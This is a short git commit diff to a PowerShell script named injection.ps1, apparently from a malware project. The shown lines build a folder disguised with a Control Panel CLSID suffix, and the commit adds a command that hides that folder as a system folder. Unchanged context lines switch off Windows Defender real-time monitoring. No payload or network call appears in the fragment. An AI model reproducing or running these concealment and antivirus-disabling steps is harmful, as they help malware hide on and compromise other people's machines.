625233151c4f5b356b0b4bfcb1ce1afc92cbf803
43a1723 <hai1723notgay@gmail.com>
2024-06-20 17:52:12 +0700

    Update injection.ps1

--- injection.ps1
+++ injection.ps1
@@ -1,5 +1,7 @@
-$rdir = "C:\Users\startup"
+$rdir = "C:\Users\hai1723"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+attrib +h +s $dir
+
 $temp = "$dir\temp"
 
 Set-MpPreference -DisableRealtimeMonitoring $true
